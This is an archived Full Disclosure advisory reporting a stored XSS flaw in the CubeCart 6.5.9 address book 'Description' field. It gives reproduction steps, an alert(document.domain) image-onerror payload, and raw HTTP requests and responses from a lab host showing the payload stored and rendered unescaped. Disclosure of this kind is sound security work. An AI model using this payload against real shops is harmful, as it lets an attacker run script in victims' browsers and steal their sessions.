---
title: Stored XSS in "Description" Functionality - cubecartv6.5.9
url: https://seclists.org/fulldisclosure/2025/Jun/4
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:32.518734
---

# Stored XSS in "Description" Functionality - cubecartv6.5.9

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# Stored XSS in "Description" Functionality - cubecartv6.5.9

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Fri, 30 May 2025 00:04:32 +0100

---

```
# Exploit Title: Stored XSS in "Description" Functionality - cubecartv6.5.9
# Date: 05/2025
# Exploit Author: Andrey Stoykov
# Version: 6.5.9
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Stored XSS #1:

Steps to Reproduce:

1. Visit "Account" > "Address Book" and choose "Edit"
2. In the "Description" parameter enter the following payload
<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">

// HTTP POST Request

POST /cubecart/index.php?_a=addressbook&action=edit&address_id=1 HTTP/1.1
Host: 192.168.58.186
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0)
Gecko/20100101 Firefox/139.0
[...]

------geckoformboundary6f5a64973a1e97b9d4b5c2a0d79601a6
Content-Disposition: form-data; name="description"

<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">
------geckoformboundary6f5a64973a1e97b9d4b5c2a0d79601a6
Content-Disposition: form-data; name="title"
[...]

// HTTP Response

HTTP/1.1 302 Found
Date: Sun, 18 May 2025 12:16:17 GMT
Server: Apache/2.4.56 (Unix) OpenSSL/1.1.1t PHP/8.2.4 mod_perl/2.0.12
Perl/v5.34.1
X-Frame-Options: SAMEORIGIN
X-Powered-By: PHP/8.2.4
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
[...]

// HTTP GET Request

GET /cubecart/index.php?_a=addressbook HTTP/1.1
Host: 192.168.58.186
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0)
Gecko/20100101 Firefox/139.0
[...]

// HTTP Response

HTTP/1.1 200 OK
Date: Sun, 18 May 2025 12:16:41 GMT
Server: Apache/2.4.56 (Unix) OpenSSL/1.1.1t PHP/8.2.4 mod_perl/2.0.12
Perl/v5.34.1
X-Frame-Options: SAMEORIGIN
X-Powered-By: PHP/8.2.4
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: CC_1349B74620=k6fd07i7h211fg1d69p5mvkuru;Expires=Monday,
19-May-2025 12:16:41 UTC;Domain=.192.168.58.186;Path=/cubecart;HttpOnly
Vary: Accept-Encoding
Content-Length: 42139
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

[...]
<div class="small-12 columns"><h5><a
href="?_a=addressbook&action=edit&address_id=1"><iframe><textarea></iframe><img
src="" onerror="alert(document.domain)"></a></h5></div>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **Stored XSS in "Description" Functionality - cubecartv6.5.9** *Andrey Stoykov (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")